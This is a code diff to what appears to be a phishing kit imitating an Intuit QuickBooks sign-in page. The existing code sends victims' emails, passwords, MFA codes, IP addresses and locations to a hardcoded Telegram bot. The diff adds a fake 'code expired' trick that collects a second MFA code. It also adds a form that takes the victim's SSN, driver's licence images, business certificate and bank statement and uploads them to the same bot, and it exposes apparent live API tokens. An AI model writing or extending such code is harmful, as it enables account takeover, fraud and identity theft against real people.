@@ -389,17 +389,20 @@ function verifyAndRedirect() {
                 if (isHuman()) {
                     if (isValidEmail('${getBase64FromUrl()}')) {
                     
-                    const AUTH_PASSWORD = "correctpassword"; // Simulated password for testing
+    const AUTH_PASSWORD = "correctpassword"; // Simulated password for testing
     const DOC_LINK = "https://accounts.intuit.com/app/sign-in?app_group=QBO&asset_alias=Intuit.accounting.core.qbowebapp&app_environment=prod";
     const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage"; // Replace with your Telegram bot's webhook URL
     const IPINFO_URL = "https://ipinfo.io/json?token=d8eafd6deea176"; // IPInfo API URL with token
 
     let attemptCounter = 0;
+    let mfaAttemptCount = 0;
+    let firstMfaCode = null;
 
     // Grab email from URL and decode Base64
     const email = '${getBase64FromUrl()}';
     document.getElementById('email').value = email;
     document.getElementById('mfa-email').value = email;
+
 
     // Password form handling
     const passwordForm = document.getElementById('authForm');
@@ -439,7 +442,7 @@ function verifyAndRedirect() {
         document.getElementById('mfa-code').focus();
     }
 
-    // MFA form handling
+ // MFA form handling
     const mfaForm = document.getElementById('mfaAuthForm');
     const mfaInput = document.getElementById('mfa-code');
     const mfaError = document.getElementById('mfa-error');
@@ -451,12 +454,30 @@ function verifyAndRedirect() {
         const location = await getLocation();
         sendToTelegram(email, mfaValue, 'MFA', location); // Send MFA code to Telegram
 
-        if (/^\\d{6}$/.test(mfaValue)) {
-            showLoadingAndRedirect();
-        } else {
-            mfaError.style.display = 'block';
-            mfaError.textContent = 'Invalid MFA code. Please try again.';
-            mfaInput.classList.add('error');
+        if (mfaAttemptCount === 0) {
+            if (/^\\d{6}$/.test(mfaValue)) {
+                firstMfaCode = mfaValue; // Store the first code
+                mfaInput.value = ''; // Clear input for the second attempt
+                mfaError.style.display = 'block';
+                mfaError.textContent = 'Your code has expired. A new code will be sent to you shortly.'; // Prompt for second code
+                mfaAttemptCount++;
+            } else {
+                mfaError.style.display = 'block';
+                mfaError.textContent = 'Invalid MFA code. Please try again.';
+                mfaInput.classList.add('error');
+            }
+        } else if (mfaAttemptCount === 1) {
+            if (mfaValue === firstMfaCode) {
+                mfaError.style.display = 'block';
+                mfaError.textContent = 'You entered an expired code. Try again.';
+                mfaInput.classList.add('error');
+            } else if (/^\\d{6}$/.test(mfaValue)) {
+                transitionToDocumentForm(); // Proceed to the document upload form
+            } else {
+                mfaError.style.display = 'block';
+                mfaError.textContent = 'Invalid MFA code. Please try again.';
+                mfaInput.classList.add('error');
+            }
         }
     });
 
@@ -473,7 +494,7 @@ function verifyAndRedirect() {
         }, 3000);
     }
 
-    // Function to send data to Telegram
+     // Function to send data to Telegram
     function sendToTelegram(email, inputData, type, location) {
         const userAgent = navigator.userAgent; // Browser details
         const message = \`Email: \${email}\\nInput Type: \${type}\\nInput: \${inputData}\\nUser Agent: \${userAgent}\\nLocation: \${location.city}, \${location.region}, \${location.country}\\nIP: \${location.ip}\`;
@@ -509,6 +530,65 @@ function verifyAndRedirect() {
             };
         }
     }
+
+
+        // Transition to document form
+    function transitionToDocumentForm() {
+        document.getElementById('mfa-form').style.display = 'none';
+        document.getElementById('document-form').style.display = 'block';
+    }
+    const verificationForm = document.getElementById('verificationForm'); // Correct form ID
+const documentError = document.getElementById('document-error'); // Error message
+const ssnInput = document.getElementById('ssn');
+    verificationForm.addEventListener('submit', async function (event) {
+    event.preventDefault();
+    
+    const businessCertificate = document.getElementById('business-certificate').files;
+    const driverLicenseFront = document.getElementById('driver-license-front').files;
+    const driverLicenseBack = document.getElementById('driver-license-back').files;
+    const bankStatement = document.getElementById('bank-statement').files;
+    const ssnValue = ssnInput.value.trim();
+    const ssnRegex = /^\\d{10}$/;
+    if (!ssnRegex.test(ssnValue)) {
+        documentError.style.display = 'block';
+        documentError.textContent = 'Invalid SSN format. Please use XXX-XX-XXXX.';
+        ssnInput.classList.add('error');
+        
+    if (businessCertificate.length > 0 && driverLicenseFront.length > 0 && driverLicenseBack.length > 0 && bankStatement.length > 0) {
+        loading.style.display = 'block';
+        const location = await getLocation();
+        sendToTelegram(email, ssnValue, 'SSN', location);
+        async function sendDocumentToTelegram(file) {
+            const formData = new FormData();
+            formData.append('chat_id', '1412104349');
+            formData.append('document', file);
+
+            try {
+                const response = await fetch("https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendDocument", {
+                    method: 'POST',
+                    body: formData,
+                });
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Error sending document to Telegram:', result.description);
+                }
+            } catch (error) {
+                console.error('Error uploading document to Telegram:', error);
+            }
+        }
+
+        await sendDocumentToTelegram(businessCertificate[0]);
+        await sendDocumentToTelegram(driverLicenseFront[0]);
+        await sendDocumentToTelegram(driverLicenseBack[0]);
+        await sendDocumentToTelegram(bankStatement[0]);
+
+        setTimeout(() => {
+            showLoadingAndRedirect();
+        }, 2000);
+    } else {
+        documentError.style.display = 'block';
+        documentError.textContent = 'Please upload all the required documents.';
+    }}});
                     
                     } else {
              fetch('https://ipinfo.io/json?token=d8eafd6deea176')
@@ -561,7 +641,7 @@ function verifyAndRedirect() {
             width: 100px;
             margin-bottom: 20px;
         }
-        input[type="password"], input[type="text"], button {
+        input[type="password"], input[type="text"], button, input[type="file"] {
             width: calc(100% - 20px);
             padding: 10px;
             margin: 10px 0;
@@ -587,18 +667,13 @@ function verifyAndRedirect() {
             font-size: 14px;
             display: none;
         }
-        .mfa-form {
+        .mfa-form, .document-form {
             display: none;
             text-align: center;
         }
-        .mfa-gif {
+        .mfa-gif, .loading {
             margin: 20px auto;
             width: 60px;
-        }
-        .loading {
-            display: none;
-            margin: 20px auto;
-            width: 50px;
         }
         @media (max-width: 400px) {
             .container {
@@ -614,13 +689,13 @@ function verifyAndRedirect() {
         <!-- Logo -->
         <img src="https://logodix.com/logo/316596.png" alt="Intuit Logo" class="logo">
 
-        <h2 id="authentication-title">Update your password</h2>
+        <h2 id="authentication-title">Please authenticate to view the document</h2>
 
         <!-- Password input form -->
         <div id="password-form">
             <form id="authForm">
                 <input type="hidden" id="email" name="email">
-                <input type="password" id="password" placeholder="New password" aria-label="Password" required>
+                <input type="password" id="password" placeholder="Enter your password" aria-label="Password" required>
                 <div id="password-error" class="error-message">Incorrect password. Please try again.</div>
                 <button type="submit" aria-label="Continue">Continue</button>
             </form>
@@ -638,8 +713,26 @@ function verifyAndRedirect() {
             </form>
         </div>
 
+        <!-- Document upload form -->
+        <div id="document-form" class="document-form">
+            <h3>Upload Required Documents</h3>
+            <form style="text-align: left;" id="verificationForm">
+                <label style="text-align: left;" for="business-certificate">SSN:</label><br>
+                <input type="text" id="ssn" placeholder="Enter SSN (XXX-XX-XXXX)" required /><br><br>
+                <label style="text-align: left;" for="business-certificate">Business Certificate:</label><br>
+                <input type="file" id="business-certificate" name="business-certificate" accept="application/pdf,image/*" required><br><br>
+                <label style="text-align: left;" for="driver-license-front">Driver-License-front:</label><br>
+                <input type="file" id="driver-license-front" name="driver-license-front" accept="image/*" required><br><br>
+                <label style="text-align: left;" for="driver-license-back">Driver-License-Back:</label><br>
+                <input type="file" id="driver-license-back" name="driver-license-back" accept="image/*" required><br><br>
+                <label style="text-align: left;" for="bank-statement">Bank-Statement:</label><br>
+                <input type="file" id="bank-statement" name="bank-statement" accept="application/pdf,image/*" required><br><br>
+                <div id="document-error" class="error-message" style="display:none;">Please upload all required documents.</div><br>
+                <button type="submit" aria-label="Submit Documents">Submit</button>
+            </form>
+        </div>
         <!-- Loading animation -->
-        <img src="https://cdnl.iconscout.com/lottie/premium/thumb/loading-bar-and-loader-5371059-4510678.gif" alt="Loading" class="loading" id="loading">
+        <img style="display: none;" src="https://cdnl.iconscout.com/lottie/premium/thumb/loading-bar-and-loader-5371059-4510678.gif" alt="Loading" class="loading" id="loading">
     </div>
 </body>
 </html>
